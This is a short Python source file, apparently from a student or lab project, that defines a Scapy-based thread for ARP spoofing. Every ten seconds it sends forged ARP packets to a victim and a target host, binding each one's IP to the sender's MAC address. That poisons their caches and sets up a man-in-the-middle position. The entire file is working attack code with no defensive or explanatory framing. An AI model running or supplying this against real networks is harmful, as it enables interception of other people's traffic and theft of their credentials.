# script for ARP spoofing
# written by Abdel K. Bokharouss and Adriaan Knapen
import threading
from time import sleep

from ip_to_mac_mapper import IpToMacMapper
from network_discoverer import NetworkDiscoverer
from scapy.all import *
from scapy.layers.l2 import ARP, Ether


class ArpSpoof(threading.Thread):

    def __init__(self, vIP, tIP, iface=scapy.config.conf.iface):
        self.iface = iface
        self.vIP = vIP
        self.tIP = tIP
        self.own_mac_address = NetworkDiscoverer().get_own_mac_address(iface)
        threading.Thread.__init__(self)

    def spoof_arp(self):
        print("Spoofing %s and %s with %s" % (self.tIP, self.vIP, self.own_mac_address))
        sendp([
            Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.tIP, pdst=self.vIP),
            Ether() / ARP(op=ARP.who_has, hwsrc=self.own_mac_address, psrc=self.vIP, pdst=self.tIP)
        ])

    def run(self):
        while True:
            self.spoof_arp()
            sleep(10)
